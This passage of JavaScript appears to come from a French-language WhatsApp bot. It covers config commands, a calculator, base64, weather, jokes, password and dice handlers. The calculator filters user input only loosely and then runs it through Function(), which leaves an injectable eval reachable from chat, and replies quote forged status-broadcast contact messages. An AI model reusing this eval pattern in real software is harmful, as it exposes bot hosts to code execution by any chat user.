╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴅᴇɴɪᴇᴅ ❌
│. • ʀᴇᴀsᴏɴ : ɴᴏ ᴘᴇʀᴍɪssɪᴏɴ
╰┄『 𝐒𝐄𝐓𝐏𝐀𝐓𝐇 𝐒𝐘𝐒𝐓𝐄𝐌 』
`
    }, { quoted: shonux });

    break;
  }

  const pathNumber = args[0]?.trim();
  if (!pathNumber) {
    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_SETPATH2" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD
VERSION:3.0
N:${BOT_NAME_FANCY};;;;
FN:${BOT_NAME_FANCY}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    return await socket.sendMessage(sender, {
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴍɪssɪɴɢ ɪɴᴘᴜᴛ ❌
│. • ᴜsᴀɢᴇ : .sᴇᴛᴘᴀᴛʜ 000000000
╰┄『 𝐒𝐄𝐓𝐏𝐀𝐓𝐇 𝐌𝐎𝐃𝐔𝐋𝐄 』
`
    }, { quoted: shonux });
  }

  const cleanPathNumber = pathNumber.replace(/[^0-9]/g, '');
  if (cleanPathNumber.length < 8) {
    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_SETPATH3" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD
VERSION:3.0
N:${BOT_NAME_FANCY};;;;
FN:${BOT_NAME_FANCY}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    return await socket.sendMessage(sender, {
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ɪɴᴠᴀʟɪᴅ ❌
│. • ʀᴇᴀsᴏɴ : ɴᴜᴍʙᴇʀ ᴛᴏᴏ sʜᴏʀᴛ
╰┄『 𝐒𝐄𝐓𝐏𝐀𝐓𝐇 𝐕𝐀𝐋𝐈𝐃𝐀𝐓𝐈𝐎𝐍 』
`
    }, { quoted: shonux });
  }

  try {
    let cfg = await loadUserConfigFromMongo(sanitized) || {};

    cfg.savePath = `${cleanPathNumber}@s.whatsapp.net`;
    cfg.savePathNumber = cleanPathNumber;

    await setUserConfigInMongo(sanitized, cfg);

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_SETPATH4" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD
VERSION:3.0
N:${BOT_NAME_FANCY};;;;
FN:${BOT_NAME_FANCY}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    await socket.sendMessage(sender, {
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : sᴜᴄᴄᴇss ✅
│. • ᴘᴀᴛʜ : ${cleanPathNumber}
│. • ᴛᴀʀɢᴇᴛ : ${cleanPathNumber}@s.whatsapp.net
╰┄『 𝐒𝐄𝐓𝐏𝐀𝐓𝐇 𝐃𝐎𝐍𝐄 』
`
    }, { quoted: shonux });

  } catch (e) {
    console.error('setpath error', e);

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_SETPATH5" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD
VERSION:3.0
N:${BOT_NAME_FANCY};;;;
FN:${BOT_NAME_FANCY}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    await socket.sendMessage(sender, {
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴇʀʀᴏʀ ❌
│. • ᴍᴇssᴀɢᴇ : ${e.message}
╰┄『 𝐒𝐄𝐓𝐏𝐀𝐓𝐇 𝐄𝐑𝐑𝐎𝐑 』
`
    }, { quoted: shonux });
  }

  break;
}

case 'getpath': {
  try {
    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_GETPATH" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD
VERSION:3.0
N:${BOT_NAME_FANCY};;;;
FN:${BOT_NAME_FANCY}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    if (cfg.savePath) {
      await socket.sendMessage(sender, {
        text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴀᴄᴛɪᴠᴇ ✅
│. • ɴᴜᴍʙᴇʀ : ${cfg.savePathNumber}
│. • ᴊɪᴅ : ${cfg.savePath}
│. • ᴛɪᴍᴇ : ${cfg.updatedAt ? new Date(cfg.updatedAt).toLocaleString('fr-FR') : 'ɴ/ᴀ'}
╰┄『 𝐒𝐀𝐕𝐄 𝐏𝐀𝐓𝐇 𝐈𝐍𝐅𝐎 』
`
      }, { quoted: shonux });

    } else {
      await socket.sendMessage(sender, {
        text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ɪɴᴀᴄᴛɪᴠᴇ ⚠️
│. • ʀᴇᴀsᴏɴ : ɴᴏ ᴘᴀᴛʜ ᴄᴏɴғɪɢᴜʀᴇᴅ
│. • ᴜsᴀɢᴇ : .sᴇᴛᴘᴀᴛʜ <ɴᴜᴍʙᴇʀ>
╰┄『 𝐒𝐀𝐕𝐄 𝐏𝐀𝐓𝐇 𝐒𝐘𝐒𝐓𝐄𝐌 』
`
      }, { quoted: shonux });
    }

  } catch (e) {
    console.error('getpath error', e);

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_GETPATH_ERR" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD
VERSION:3.0
N:${BOT_NAME_FANCY};;;;
FN:${BOT_NAME_FANCY}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD` } }
    };

    await socket.sendMessage(sender, {
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴇʀʀᴏʀ ❌
│. • ᴍᴇssᴀɢᴇ : ᴄᴀɴɴᴏᴛ ʀᴇᴛʀɪᴇᴠᴇ ᴅᴀᴛᴀ
╰┄『 𝐆𝐄𝐓𝐏𝐀𝐓𝐇 𝐒𝐘𝐒𝐓𝐄𝐌 』
`
    }, { quoted: shonux });
  }

  break;
}

case 'showconfig': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  try {
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓';

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_SHOWCONFIG"
      },
      message: {
        contactMessage: {
          displayName: botName,
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${botName};;;;
FN:${botName}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD`
        }
      }
    };

    let txt = `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴇssɪᴏɴ : ${sanitized}
│. • ʙᴏᴛ ɴᴀᴍᴇ : ${botName}
│. • ɴᴜᴍʙᴇʀ : ${sanitized}
│. • ʟᴏɢᴏ : ${cfg.logo || config.RCD_IMAGE_PATH}
╰┄『 𝐂𝐎𝐍𝐅𝐈𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 』
`;

    await socket.sendMessage(sender, { text: txt }, { quoted: shonux });

  } catch (e) {
    console.error('showconfig error', e);

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_SHOWCONFIG2"
      },
      message: {
        contactMessage: {
          displayName: '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓',
          vcard: `BEGIN:VCARD
VERSION:3.0
N:YOU WEB BOT;;;;
FN:YOU WEB BOT
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD`
        }
      }
    };

    await socket.sendMessage(sender, { text: '❌ ᴇʀʀᴏʀ ʟᴏᴀᴅɪɴɢ ᴄᴏɴғɪɢ' }, { quoted: shonux });
  }
  break;
}

case 'resetconfig': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  const senderNum = (nowsender || '').split('@')[0];
  const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');

  if (senderNum !== sanitized && senderNum !== ownerNum) {
    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_RESETCONFIG1"
      },
      message: {
        contactMessage: {
          displayName: BOT_NAME_FANCY,
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${BOT_NAME_FANCY};;;;
FN:${BOT_NAME_FANCY}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD`
        }
      }
    };

    await socket.sendMessage(sender, {
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴅᴇɴɪᴇᴅ ❌
│. • ʀᴇᴀsᴏɴ : ɴᴏ ᴘᴇʀᴍɪssɪᴏɴ
│. • ᴍᴏᴅᴜʟᴇ : ʀᴇsᴇᴛ ᴄᴏɴғɪɢ
╰┄『 𝐒𝐘𝐒𝐓𝐄𝐌 』
`
    }, { quoted: shonux });

    break;
  }

  try {
    await setUserConfigInMongo(sanitized, {});

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_RESETCONFIG2"
      },
      message: {
        contactMessage: {
          displayName: BOT_NAME_FANCY,
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${BOT_NAME_FANCY};;;;
FN:${BOT_NAME_FANCY}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid:50941319791:+509 4131 9791
END:VCARD`
        }
      }
    };

    await socket.sendMessage(sender, {
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : sᴜᴄᴄᴇss ✅
│. • ᴍᴏᴅᴜʟᴇ : ʀᴇsᴇᴛ ᴄᴏɴғɪɢ
│. • sᴛᴀɢᴇ : ᴅᴇғᴀᴜʟᴛ ʀᴇsᴛᴏʀᴇᴅ
╰┄『 𝐂𝐎𝐍𝐅𝐈𝐆 𝐑𝐄𝐒𝐄𝐓 』
`
    }, { quoted: shonux });

  } catch (e) {
    console.error('resetconfig error', e);

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_RESETCONFIG3"
      },
      message: {
        contactMessage: {
          displayName: BOT_NAME_FANCY,
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${BOT_NAME_FANCY};;;;
FN:${BOT_NAME_FANCY}
ORG:𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓
TEL;type=CELL;type=VOICE;waid=50941319791:+509 4131 9791
END:VCARD`
        }
      }
    };

    await socket.sendMessage(sender, {
      text: `
╭┄『 ⊹ ࣪𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ 』
│. • sᴛᴀᴛᴜs : ᴇʀʀᴏʀ ❌
│. • ᴍᴇssᴀɢᴇ : ғᴀɪʟᴇᴅ ʀᴇsᴇᴛ
╰┄『 𝐒𝐘𝐒𝐓𝐄𝐌 』
`
    }, { quoted: shonux });
  }

  break;
}


// ============================================================
// 🧮 CALC — Calculatrice avancée
// ============================================================
case 'calc':
case 'calculate':
case 'math': {
  try {
    const expr = args.join(' ').trim();

    if (!expr) {
      return await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🧮 *𝐂𝐀𝐋𝐂𝐔𝐋𝐀𝐓𝐑𝐈𝐂𝐄*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ :
│. ˚˖𓍢ִ໋• .calc 25 * 4 + 10
│. ˚˖𓍢ִ໋• .calc sqrt(144)
│. ˚˖𓍢ִ໋• .calc (5^3) / 25
│. ˚˖𓍢ִ໋• .calc sin(90) * 100
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    react("🧮");

    // Sécurisation de l'expression
    const safe = expr.replace(/[^0-9+\-*/().,%^ a-zA-Z]/g, '');

    // Remplacements pour les fonctions communes
    let jsExpr = safe
      .replace(/sqrt\(/gi, 'Math.sqrt(')
      .replace(/abs\(/gi,  'Math.abs(')
      .replace(/ceil\(/gi, 'Math.ceil(')
      .replace(/floor\(/gi,'Math.floor(')
      .replace(/round\(/gi,'Math.round(')
      .replace(/log\(/gi,  'Math.log(')
      .replace(/sin\(/gi,  'Math.sin(')
      .replace(/cos\(/gi,  'Math.cos(')
      .replace(/tan\(/gi,  'Math.tan(')
      .replace(/pi/gi,     'Math.PI')
      .replace(/\^/g,      '**');

    // eslint-disable-next-line no-eval
    const result = Function('"use strict"; return (' + jsExpr + ')')();

    if (typeof result !== 'number' || !isFinite(result)) throw new Error('Résultat invalide');

    const formatted = Number.isInteger(result) ? result.toString() : result.toFixed(6).replace(/\.?0+$/, '');

    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🧮 *𝐂𝐀𝐋𝐂𝐔𝐋𝐀𝐓𝐑𝐈𝐂𝐄*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋📥 ᴇxᴘʀᴇssɪᴏɴ :
│. ˚˖𓍢ִ໋  ${expr}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋✅ ʀᴇ́sᴜʟᴛᴀᴛ :
│. ˚˖𓍢ִ໋  *${formatted}*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 🎠
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    react("✅");
  } catch (e) {
    react("❌");
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐄𝐑𝐑𝐄𝐔𝐑 𝐂𝐀𝐋𝐂𝐔𝐋*
│. ˚˖𓍢ִ໋• Expression invalide
│. ˚˖𓍢ִ໋• Ex: .calc 25 * 4
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}

// ============================================================
// 🔐 B64 — Encodeur/Décodeur Base64
// ============================================================
case 'b64':
case 'base64': {
  try {
    const mode = args[0]?.toLowerCase();
    const text = args.slice(1).join(' ').trim();

    if (!mode || !text || !['encode','decode','e','d'].includes(mode)) {
      return await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔐 *𝐁𝐀𝐒𝐄𝟔𝟒*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ :
│. ˚˖𓍢ִ໋• .b64 encode <texte>
│. ˚˖𓍢ִ໋• .b64 decode <base64>
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    react("🔐");

    let result;
    let action;
    if (mode === 'encode' || mode === 'e') {
      result = Buffer.from(text, 'utf8').toString('base64');
      action = 'ENCODÉ';
    } else {
      result = Buffer.from(text, 'base64').toString('utf8');
      action = 'DÉCODÉ';
    }

    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔐 *𝐁𝐀𝐒𝐄𝟔𝟒 — ${action}*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋📥 ᴇɴᴛʀᴇ́ᴇ :
│. ˚˖𓍢ִ໋  ${text.slice(0, 60)}${text.length > 60 ? '...' : ''}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋✅ ʀᴇ́sᴜʟᴛᴀᴛ :
│. ˚˖𓍢ִ໋  ${result.slice(0, 200)}${result.length > 200 ? '...' : ''}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 🎠
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    react("✅");
  } catch (e) {
    react("❌");
    await socket.sendMessage(from, {
      text: `❌ B64 ERROR: ${e.message}`
    }, { quoted: msg });
  }
  break;
}

// ============================================================
// 🌤️ WEATHER — Météo en temps réel
// ============================================================
case 'weather':
case 'meteo':
case 'météo': {
  try {
    const city = args.join(' ').trim();

    if (!city) {
      return await socket.sendMessage(from, {
        text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🌤️ *𝐌𝐄́𝐓𝐄́𝐎*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋📌 ᴜsᴀɢᴇ :
│. ˚˖𓍢ִ໋• .weather Paris
│. ˚˖𓍢ִ໋• .meteo Port-au-Prince
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      }, { quoted: msg });
    }

    react("⏳");

    const wttrRes = await axios.get(
      `https://wttr.in/${encodeURIComponent(city)}?format=j1`,
      { timeout: 10000, headers: { 'User-Agent': 'curl/7.68.0' } }
    );

    const w = wttrRes.data;
    const cur = w.current_condition?.[0];
    const area = w.nearest_area?.[0];

    if (!cur) throw new Error('Météo introuvable');

    const cityName  = area?.areaName?.[0]?.value || city;
    const country   = area?.country?.[0]?.value || '';
    const tempC     = cur.temp_C;
    const feelsLike = cur.FeelsLikeC;
    const humidity  = cur.humidity;
    const wind      = cur.windspeedKmph;
    const desc      = cur.lang_fr?.[0]?.value || cur.weatherDesc?.[0]?.value || 'Inconnu';
    const visibility= cur.visibility;
    const pressure  = cur.pressure;
    const uv        = cur.uvIndex;

    // Emoji météo
    const tempNum = parseInt(tempC);
    const tempEmoji = tempNum >= 35 ? '🔥' : tempNum >= 25 ? '☀️' : tempNum >= 15 ? '⛅' : tempNum >= 5 ? '🌧️' : '❄️';

    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🌍 *𝐌𝐄́𝐓𝐄́𝐎 — ${cityName.toUpperCase()}*
│. ˚˖𓍢ִ໋📍 ${cityName}, ${country}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋${tempEmoji} ᴛᴇᴍᴘ       : *${tempC}°C*
│. ˚˖𓍢ִ໋🌡️ ʀᴇssᴇɴᴛɪ    : ${feelsLike}°C
│. ˚˖𓍢ִ໋💧 ʜᴜᴍɪᴅɪᴛᴇ́    : ${humidity}%
│. ˚˖𓍢ִ໋💨 ᴠᴇɴᴛ         : ${wind} km/h
│. ˚˖𓍢ִ໋👁️  ᴠɪsɪʙɪʟɪᴛᴇ́  : ${visibility} km
│. ˚˖𓍢ִ໋🔵 ᴘʀᴇssɪᴏɴ     : ${pressure} hPa
│. ˚˖𓍢ִ໋☀️ ɪɴᴅɪᴄᴇ ᴜᴠ   : ${uv}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋📋 ᴄᴏɴᴅɪᴛɪᴏɴ    : ${desc}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 🎠
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    react("✅");
  } catch (e) {
    react("❌");
    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋❌ *𝐌𝐄́𝐓𝐄́𝐎 𝐄𝐑𝐑𝐄𝐔𝐑*
│. ˚˖𓍢ִ໋• Ville introuvable
│. ˚˖𓍢ִ໋• Ex: .weather Paris
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });
  }
  break;
}

// ============================================================
// 😂 JOKE — Blague aléatoire FR/EN
// ============================================================
case 'joke':
case 'blague':
case 'fun': {
  try {
    react("😂");

    const lang = args[0]?.toLowerCase() === 'fr' ? 'fr' : 'en';

    let jokeText;

    if (lang === 'fr') {
      const frJokes = [
        "Pourquoi les plongeurs plongent-ils toujours en arrière ? 😄\nParce que s'ils plongeaient en avant, ils tomberaient dans le bateau !",
        "Un homme entre dans une bibliothèque et demande : 'Avez-vous des livres sur la paranoïa ?'\nLa bibliothécaire chuchote : 'Ils sont juste derrière vous...' 📚",
        "Qu'est-ce qu'un canif ? 🤔\nUn petit fien ! (chien)",
        "Pourquoi les informaticiens confondent-ils Halloween et Noël ? 🎃\nParce que Oct 31 = Dec 25 !",
        "Un crocodile attaque un homme en habit. Le juge acquitte le crocodile.\nMoralité : il ne faut jamais attaquer un avocat. ⚖️",
        "Docteur, j'ai avalé un stylo ! Qu'est-ce que je fais ?\nAsseyez-vous, j'arrive dans 10 minutes... j'ai plus de stylo. ✏️",
        "Pourquoi les vampires sont-ils végétariens ? 🧛\nParce qu'ils ne mangent que de la salade de Dracula !",
        "Comment appelle-t-on un chien sans pattes ? 🐕\nPoco importe, il viendra pas quand même."
      ];
      jokeText = frJokes[Math.floor(Math.random() * frJokes.length)];
    } else {
      try {
        const jokeRes = await axios.get('https://official-joke-api.appspot.com/random_joke', { timeout: 8000 });
        jokeText = `${jokeRes.data.setup}\n\n😄 *${jokeRes.data.punchline}*`;
      } catch {
        const enJokes = [
          "Why don't scientists trust atoms? 🔬\nBecause they make up everything!",
          "Why did the scarecrow win an award? 🏆\nBecause he was outstanding in his field!",
          "I told my wife she was drawing her eyebrows too high.\nShe looked surprised. 😲",
          "Why can't you give Elsa a balloon? 🎈\nBecause she'll let it go!",
          "What do you call cheese that isn't yours? 🧀\nNacho cheese!"
        ];
        jokeText = enJokes[Math.floor(Math.random() * enJokes.length)];
      }
    }

    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋😂 *𝐁𝐋𝐀𝐆𝐔𝐄 𝐃𝐔 𝐉𝐎𝐔𝐑*
│. ˚˖𓍢ִ໋
${jokeText.split('\n').map(l => `│. ˚˖𓍢ִ໋${l}`).join('\n')}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋💡 .joke fr — blagues FR
│. ˚˖𓍢ִ໋𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 🎠
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    react("😂");
  } catch (e) {
    react("❌");
    await socket.sendMessage(from, { text: `❌ JOKE ERROR: ${e.message}` }, { quoted: msg });
  }
  break;
}

// ============================================================
// 🔑 PASSWORD — Générateur de mot de passe fort
// ============================================================
case 'password':
case 'passwd':
case 'mdp':
case 'genpass': {
  try {
    react("🔑");

    const length   = Math.min(Math.max(parseInt(args[0]) || 16, 8), 64);
    const useUpper = !args.includes('noup');
    const useLower = !args.includes('nolow');
    const useNums  = !args.includes('nonum');
    const useSpec  = !args.includes('nospec');

    let charset = '';
    if (useLower)  charset += 'abcdefghijklmnopqrstuvwxyz';
    if (useUpper)  charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (useNums)   charset += '0123456789';
    if (useSpec)   charset += '!@#$%^&*()-_=+[]{}|;:,.<>?';

    if (!charset) charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';

    let pwd = '';
    const arr = new Uint8Array(length);
    require('crypto').randomFillSync(arr);
    for (let i = 0; i < length; i++) {
      pwd += charset[arr[i] % charset.length];
    }

    // Calcul entropie
    const entropy = Math.floor(length * Math.log2(charset.length));
    const strength = entropy >= 128 ? '🔴 TRÈS FORT' : entropy >= 80 ? '🟠 FORT' : entropy >= 60 ? '🟡 MOYEN' : '⚪ FAIBLE';

    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🔑 *𝐌𝐎𝐓 𝐃𝐄 𝐏𝐀𝐒𝐒𝐄 𝐆𝐄́𝐍𝐄́𝐑𝐄́*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋🔐 ᴍᴏᴛ ᴅᴇ ᴘᴀssᴇ :
│. ˚˖𓍢ִ໋  *${pwd}*
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋📏 ʟᴏɴɢᴜᴇᴜʀ   : ${length}
│. ˚˖𓍢ִ໋⚡ ᴇɴᴛʀᴏᴘɪᴇ   : ${entropy} bits
│. ˚˖𓍢ִ໋💪 ʀᴏʙᴜsᴛᴇssᴇ : ${strength}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋💡 .password 32 — 32 chars
│. ˚˖𓍢ִ໋   .password 16 nospec
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 🎠
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

    react("✅");
  } catch (e) {
    react("❌");
    await socket.sendMessage(from, { text: `❌ PASSWORD ERROR: ${e.message}` }, { quoted: msg });
  }
  break;
}

// ============================================================
// 🎲 FLIP — Pile ou Face / Dé
// ============================================================
case 'flip':
case 'coin':
case 'dice':
case 'de': {
  try {
    react("🎲");

    const type = command === 'dice' || command === 'de' ? 'dice' : 'coin';

    let resultText;
    if (type === 'dice') {
      const sides = parseInt(args[0]) || 6;
      const validSides = Math.min(Math.max(sides, 2), 100);
      const roll = Math.floor(Math.random() * validSides) + 1;
      resultText =
`│. ˚˖𓍢ִ໋🎲 ᴅᴇ́ ᴀ ${validSides} ғᴀᴄᴇs
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋🎯 ʀᴇ́sᴜʟᴛᴀᴛ : *${roll}*`;
    } else {
      const result = Math.random() < 0.5 ? 'PILE 🪙' : 'FACE 🌟';
      resultText =
`│. ˚˖𓍢ִ໋🪙 ᴘɪʟᴇ ᴏᴜ ғᴀᴄᴇ
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋🎯 ʀᴇ́sᴜʟᴛᴀᴛ : *${result}*`;
    }

    await socket.sendMessage(from, {
      text:
`╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ
│. ˚˖𓍢ִ໋🎲 *𝐉𝐄𝐔 𝐃𝐔 𝐇𝐀𝐒𝐀𝐑𝐃*
│. ˚˖𓍢ִ໋
${resultText}
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋💡 .flip — pile/face
│. ˚˖𓍢ִ໋   .dice 20 — dé 20 faces
│. ˚˖𓍢ִ໋
│. ˚˖𓍢ִ໋𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 🎠
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
    }, { quoted: msg });

